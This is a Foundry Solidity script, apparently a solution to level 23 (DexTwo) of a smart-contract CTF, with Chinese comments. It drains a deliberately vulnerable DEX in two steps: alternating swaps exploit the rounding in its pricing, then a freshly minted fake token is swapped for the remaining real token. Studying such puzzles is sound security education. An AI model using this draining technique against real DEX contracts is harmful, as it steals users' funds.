// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/access/Ownable.sol";
import "../src/levels/23-DexTwo/DexTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Level23Solution is Script {
    DexTwo _dexInstance = DexTwo(payable(0x1BEF93f9cFEFC3722D400ee774CE108b3bb70464));

    function priceLog(address token1, address token2, address wallet) public view {
        console.log("my token1 : ", _dexInstance.balanceOf(token1, wallet));
        console.log("my token2 : ", _dexInstance.balanceOf(token2, wallet));
        console.log("dex token1 : ", _dexInstance.balanceOf(token1, address(_dexInstance)));
        console.log("dex token2 : ", _dexInstance.balanceOf(token2, address(_dexInstance)));
    }

    function breakToken(address token1, address token2) public returns(bool, bool){
        address myWallet = tx.origin;

        // 授权给_dexInstance
        _dexInstance.approve(address(_dexInstance), 200);
        console.log("---------------------   begin       ----------------------");
        priceLog(token1, token2, myWallet);

        bool token1_break = false;
        bool token2_break = false;
        uint256 swapAmount = 0;

        for(uint256 i =1;i<=100;i++) {
            console.log("---------------------   ", i, "rotation      ----------------------");
            // all token1 -> token2
            // 拉高了token2的价格
            swapAmount = _dexInstance.getSwapAmount(token1, token2, _dexInstance.balanceOf(token1, myWallet));
            if(swapAmount >=  _dexInstance.balanceOf(token2, address(_dexInstance))){
                token1_break = true;
                break;
            }
            _dexInstance.swap(token1, token2, _dexInstance.balanceOf(token1, myWallet));
            priceLog(token1, token2, myWallet);

            // all token2 -> token1
            // 拉高了token1的价格
            swapAmount = _dexInstance.getSwapAmount(token2, token1, _dexInstance.balanceOf(token2, myWallet));
            if(swapAmount >= _dexInstance.balanceOf(token1,address(_dexInstance))){
                token2_break = true;
                break;
            }
            _dexInstance.swap(token2, token1,  _dexInstance.balanceOf(token2, myWallet));
            priceLog(token1, token2, myWallet);
        }

        // final
        // 一次性清空
        console.log("---------------------   final       ----------------------");
        if(token1_break){
            _dexInstance.swap(token1, token2, _dexInstance.balanceOf(token1, address(_dexInstance)));
            priceLog(token1, token2, myWallet);
            return (false, true);
        }else if(token2_break){
            _dexInstance.swap(token2, token1,  _dexInstance.balanceOf(token2, address(_dexInstance)));
            priceLog(token1, token2, myWallet);
            return (true, false);
        }
    }
    

    function run() public{
        vm.startBroadcast();
        bool token1_down = false;
        bool token2_down = false;

        // 先把其中一种代币干掉
        (token1_down, token2_down) = breakToken(_dexInstance.token1(), _dexInstance.token2());

        // 创建新的代币
        console.log("-------------------    token3   -----------------------------");
        SwappableTokenTwo token3 = new SwappableTokenTwo(address(_dexInstance), "whistle", "0xaa", 100);
        console.log("token3 balance : ", token3.balanceOf(tx.origin));
        
        // 给 DEX 授权
        token3.approve(tx.origin, address(_dexInstance), 100);

        // 给 DEX 转账 50 token3
        token3.transfer(address(_dexInstance), 50);
        console.log("token3 balance : ", token3.balanceOf(tx.origin));

        // 将剩余的代币全部取出来
        if(!token1_down){
            _dexInstance.swap(address(token3), _dexInstance.token1(), 50);
        }else{
            _dexInstance.swap(address(token3), _dexInstance.token2(), 50);
        }
        priceLog(_dexInstance.token1(),_dexInstance.token2(), tx.origin);
    
        vm.stopBroadcast();
    }
}